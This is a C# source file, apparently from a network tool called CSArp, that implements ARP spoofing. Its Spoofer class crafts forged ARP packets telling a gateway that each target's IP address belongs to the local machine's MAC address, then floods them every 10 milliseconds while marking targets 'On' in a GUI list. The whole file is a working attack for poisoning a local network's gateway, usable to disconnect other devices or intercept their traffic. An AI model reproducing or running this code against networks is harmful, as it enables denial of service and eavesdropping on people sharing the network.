using System.Collections.Generic;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap.WinPcap;
using CSArp.Model.Utilities;
using CSArp.Model.Extensions;
using System.Threading.Tasks;
using SharpPcap.Npcap;
using CSArp.View;
using System.Linq;

namespace CSArp.Model;

public class Spoofer
{
    private const string prefix = "Spoof";
    public NpcapDevice NetworkAdapter { get; set; }

    private Dictionary<IPAddress, PhysicalAddress> engagedclientlist;

    public Task Start(IView view, Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, NpcapDevice networkAdapter, CancellationToken token = default)
    {
        engagedclientlist = [];
        if (!networkAdapter.Opened)
            networkAdapter.Open();

        view.MainForm.Invoke(() =>
        {
            foreach (var data in targetlist)
            {
                for (var i = 0; i < view.ClientListView.Items.Count; i++)
                {
                    var item = view.ClientListView.Items[i];
                    if (item.SubItems[1].Text == data.Value.ToString("-") && item.SubItems[0].Text == data.Key.ToString())
                        item.SubItems[3].Text = "On";
                }
            }
        });

        foreach (var target in targetlist)
        {
            //var myipaddress = networkAdapter.ReadCurrentIpV4Address();
            var arppacketforgatewayrequest = new ArpPacket(ArpOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, networkAdapter.MacAddress, target.Key);
            var ethernetpacketforgatewayrequest = new EthernetPacket(networkAdapter.MacAddress, gatewaymacaddress, EthernetType.Arp);
            ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;

            var cts = CancellationTokenSource.CreateLinkedTokenSource(token);
            TaskBuffer.Add(cts, () => SendSpoofingPackets(target.Key, target.Value, ethernetpacketforgatewayrequest, networkAdapter, cts.Token), prefix);
            engagedclientlist.Add(target.Key, target.Value);
        }
        return Task.CompletedTask;
    }

    public async ValueTask StopAll(IView view)
    {
        view.MainForm.Invoke(() =>
        {
            for (int i = 0; i < view.ClientListView.Items.Count; i++)
            {
                var item = view.ClientListView.Items[i];
                item.SubItems[3].Text = "Off";
            }
        });
        await TaskBuffer.StopThreadByName(prefix);
        engagedclientlist?.Clear();
    }

    private static async Task SendSpoofingPackets(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, NpcapDevice captureDevice, CancellationToken token = default)
    {
        DebugOutput.Print($"Spoofing target {physicalAddress} @ {ipAddress}");
        try
        {
            while (!token.IsCancellationRequested)
            {
                captureDevice.SendPacket(ethernetpacketforgatewayrequest);
                await Task.Delay(10);
            }
        }
        catch (PcapException ex)
        {
            DebugOutput.Print($"PcapException @ DisconnectReconnect.Disconnect() [{ex.Message}]");
        }
        DebugOutput.Print($"Spoofing thread @ DisconnectReconnect.Disconnect() for {physicalAddress} @ {ipAddress} is terminating.");
    }
}
